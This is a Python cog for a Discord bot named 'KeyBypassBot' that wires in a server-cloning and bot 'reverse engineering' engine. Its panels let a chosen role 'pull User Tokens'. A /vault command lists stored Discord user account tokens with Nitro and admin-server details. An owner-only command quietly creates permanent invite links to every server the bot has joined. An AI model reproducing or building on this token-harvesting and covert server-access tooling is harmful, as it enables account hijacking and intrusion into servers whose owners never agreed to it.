"""
================================================================================
  CLONER & REVERSE ENGINEERING COG
  Integrates copyee3 Discord Cloner & Bot Reverse Engineering Engine into KeyBypassBot
================================================================================
"""

import io
import sys
import os
import aiohttp
import discord
from discord.ext import commands
from discord import app_commands, ui
from typing import Optional, Dict, Any, List

# Add parent directory to sys.path so cloner_engine can be imported
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from cloner_engine import (
    db,
    check_token_permission,
    create_control_panel_embed,
    send_v2_components,
    MainClonerPersistentView,
    InteractivePanelControlView,
    OWNER_ID,
    TOKEN
)

# --- [ Command Group: /set panel ] ---
set_group = app_commands.Group(name="set", description="จัดการการตั้งค่าระบบ")

async def execute_set_panel(interaction: discord.Interaction, allowed_role: discord.Role, channel: Optional[discord.TextChannel] = None):
    await interaction.response.defer(ephemeral=True)
    if not interaction.user.guild_permissions.administrator and interaction.user.id != OWNER_ID:
        return await interaction.followup.send("❌ คุณไม่มีสิทธิ์ใช้งานคำสั่งนี้ (ต้องเป็น Administrator)", ephemeral=True)

    target_channel = channel or interaction.channel
    if not isinstance(target_channel, discord.TextChannel):
        return await interaction.followup.send("❌ กรุณาเลือกห้องข้อความ (Text Channel) ที่ถูกต้อง", ephemeral=True)

    if interaction.guild_id:
        await db.set_guild_config(interaction.guild_id, target_channel.id, allowed_role.id)

    embed = create_control_panel_embed()
    view = InteractivePanelControlView()
    try:
        await target_channel.send(embed=embed, view=view)
        await interaction.followup.send(
            f"✅ **ติดตั้งแผงควบคุมที่ห้อง {target_channel.mention} เรียบร้อยแล้วค่ะ!**\n"
            f"• 👑 **ยศที่ได้รับสิทธิ์ใช้งาน Token:** {allowed_role.mention}\n"
            f"• 🔒 **การป้องกัน:** ปุ่ม `Token Check` และ `ดึง User Token` ถูกล็อกสิทธิ์ให้เฉพาะยศ {allowed_role.mention} หรือ Administrator เท่านั้น\n"
            f"• 🤖 **AI Engine:** ขับเคลื่อนด้วย Dual Gemini AI Studio สำหรับการ Reverse Engineering บอท\n"
            f"• 📬 **การรับไฟล์:** ข้อมูลและสคริปต์ `.py` ทั้งหมดจะถูกส่งตรงเข้า **DM** อัตโนมัติ",
            ephemeral=True
        )
    except discord.Forbidden:
        await interaction.followup.send("❌ บอทไม่มีสิทธิ์ส่งข้อความในห้องดังกล่าว", ephemeral=True)

@set_group.command(name="panel", description="ติดตั้งแผงควบคุมระบบโคลนดิสคอร์ด (บังคับกำหนดยศที่เข้าถึงระบบ Token)")
@app_commands.describe(
    allowed_role="ยศที่ได้รับอนุญาตให้ใช้งานระบบ Token & Reverse Engineering (บังคับระบุ)",
    channel="ห้องที่ต้องการติดตั้งแผงควบคุม (ค่าเริ่มต้น: ห้องปัจจุบัน)"
)
@app_commands.default_permissions(administrator=True)
async def slash_set_panel_group(interaction: discord.Interaction, allowed_role: discord.Role, channel: Optional[discord.TextChannel] = None):
    await execute_set_panel(interaction, allowed_role, channel)


class ClonerCog(commands.Cog, name="Cloner"):
    """ระบบโคลนเซิร์ฟเวอร์ดิสคอร์ด & Black-Box Bot Reverse Engineering"""

    def __init__(self, bot: commands.Bot):
        self.bot = bot

    @app_commands.command(name="set_panel", description="ติดตั้งแผงควบคุมระบบโคลนดิสคอร์ด (บังคับกำหนดยศที่เข้าถึงระบบ Token)")
    @app_commands.describe(
        allowed_role="ยศที่ได้รับอนุญาตให้ใช้งานระบบ Token & Reverse Engineering (บังคับระบุ)",
        channel="ห้องที่ต้องการติดตั้งแผงควบคุม (ค่าเริ่มต้น: ห้องปัจจุบัน)"
    )
    @app_commands.default_permissions(administrator=True)
    async def slash_set_panel(self, interaction: discord.Interaction, allowed_role: discord.Role, channel: Optional[discord.TextChannel] = None):
        await execute_set_panel(interaction, allowed_role, channel)

    @app_commands.command(name="clone_setup", description="ติดตั้งระบบก๊อปเซิร์ฟ (Components V2)")
    @app_commands.describe(
        allowed_role="ยศที่ได้รับอนุญาตให้ใช้งานระบบ Token (บังคับระบุ)",
        channel="ห้องที่จะให้บอทส่ง UI"
    )
    @app_commands.default_permissions(administrator=True)
    async def slash_clone_setup(self, interaction: discord.Interaction, allowed_role: discord.Role, channel: discord.TextChannel):
        await interaction.response.defer(ephemeral=True)
        if not interaction.user.guild_permissions.administrator and interaction.user.id != OWNER_ID:
            return await interaction.followup.send("❌ คุณไม่มีสิทธิ์ใช้คำสั่งนี้", ephemeral=True)
        if interaction.guild_id:
            await db.set_guild_config(interaction.guild_id, channel.id, allowed_role.id)
        
        # Use bot token from self.bot.http.token
        bot_token = self.bot.http.token or TOKEN
        status, data = await send_v2_components(channel.id, bot_token)
        if status in [200, 201]:
            await interaction.followup.send(f"✅ ติดตั้งระบบที่ {channel.mention} เรียบร้อยแล้วค่ะ! (ล็อกสิทธิ์ Token ให้ยศ: {allowed_role.mention})", ephemeral=True)
        else:
            await interaction.followup.send(f"❌ เกิดข้อผิดพลาด: `{data}`", ephemeral=True)

    @commands.command(name="clonesetup")
    @commands.has_permissions(administrator=True)
    async def setup_prefix(self, ctx: commands.Context, role: Optional[discord.Role] = None, channel: Optional[discord.TextChannel] = None):
        if not role:
            return await ctx.send("⚠️ บังคับระบุยศที่ได้รับสิทธิ์: `!clonesetup <@role> [#channel]`")
        target = channel or ctx.channel
        if ctx.guild:
            await db.set_guild_config(ctx.guild.id, target.id, role.id)
        bot_token = self.bot.http.token or TOKEN
        status, data = await send_v2_components(target.id, bot_token)
        if status in [200, 201]:
            await ctx.send(f"✅ ติดตั้งระบบที่ {target.mention} เรียบร้อย (ยศที่เข้าถึง Token: {role.mention})", delete_after=10)
        else:
            await ctx.send(f"❌ เกิดข้อผิดพลาด: `{data}`", delete_after=5)

    @app_commands.command(name="vault", description="ดูรายการ User Token ทั้งหมดที่บันทึกไว้ใน Token Vault (เฉพาะ Administrator)")
    @app_commands.default_permissions(administrator=True)
    async def slash_token_vault(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=True)
        if not interaction.user.guild_permissions.administrator and interaction.user.id != OWNER_ID:
            return await interaction.followup.send("❌ คุณไม่มีสิทธิ์เข้าถึง Token Vault", ephemeral=True)

        tokens = await db.get_all_tokens()
        if not tokens:
            return await interaction.followup.send("📦 **Token Vault ว่างเปล่า**: ยังไม่มี Token ที่ผ่านการตรวจสอบหรือดึงเข้ามาในระบบ", ephemeral=True)

        desc_lines = [f"📦 **รายการ Token ในระบบ (รวม {len(tokens)} บัญชี):**\n"]
        for idx, t in enumerate(tokens[:10], start=1):
            masked_tok = t['token'][:18] + "..." + t['token'][-6:] if len(t['token']) > 24 else t['token']
            desc_lines.append(f"`{idx}.` **{t['username']}** (`{t['user_id']}`) | Nitro: `{t['nitro']}` | `{t['admin_guilds']}` Admins")
            desc_lines.append(f"   ↳ 🔑 `{masked_tok}`\n")

        if len(tokens) > 10:
            desc_lines.append(f"...และอีก {len(tokens) - 10} รายการ")

        emb = discord.Embed(title="🔐 Enterprise Token Vault Manager", description="\n".join(desc_lines), color=0x5865F2)
        emb.set_footer(text=f"Total: {len(tokens)} Tokens | Secure Database Storage")
        await interaction.followup.send(embed=emb, ephemeral=True)

    @app_commands.command(name="pull_all_invites", description="ดึงลิงก์เชิญทุกดิสที่บอทอยู่")
    async def pull_all_invites(self, interaction: discord.Interaction):
        if interaction.user.id != OWNER_ID:
            return await interaction.response.send_message("❌ คุณไม่มีสิทธิ์ใช้คำสั่งนี้", ephemeral=True)
        await interaction.response.defer(ephemeral=True)
        results = [f"🌐 บอทอยู่ใน **{len(self.bot.guilds)}** เซิร์ฟเวอร์\n"]
        for guild in self.bot.guilds:
            try:
                target = guild.system_channel or next((ch for ch in guild.text_channels if ch.permissions_for(guild.me).create_instant_invite), None)
                if target:
                    invite = await target.create_invite(max_age=0, max_uses=0)
                    results.append(f"📌 **{guild.name}** • {invite.url}")
                else:
                    results.append(f"📌 **{guild.name}** • ⛔ สร้างลิงก์ไม่ได้")
            except Exception:
                results.append(f"📌 **{guild.name}** • ⛔ เกิดข้อผิดพลาด")
        final_msg = "\n".join(results)
        if len(final_msg) > 1950:
            buffer = io.BytesIO(final_msg.encode("utf-8"))
            await interaction.followup.send("📄 ส่งเป็นไฟล์:", file=discord.File(buffer, filename="invites.txt"), ephemeral=True)
        else:
            await interaction.followup.send(final_msg, ephemeral=True)


async def setup(bot: commands.Bot):
    # Register persistent views
    try:
        bot.add_view(MainClonerPersistentView())
        bot.add_view(InteractivePanelControlView())
        print("  [OK] Registered Cloner Persistent Views (MainClonerPersistentView, InteractivePanelControlView)")
    except Exception as e:
        print(f"  [WARN] Cloner View register warning: {e}")

    # Register command group /set panel
    try:
        existing_names = [cmd.name for cmd in bot.tree.get_commands()]
        if "set" not in existing_names:
            bot.tree.add_command(set_group)
    except Exception as e:
        print(f"  [WARN] set_group add warning: {e}")

    await bot.add_cog(ClonerCog(bot))
    print("  [OK] Loaded Cloner Cog into Bot")
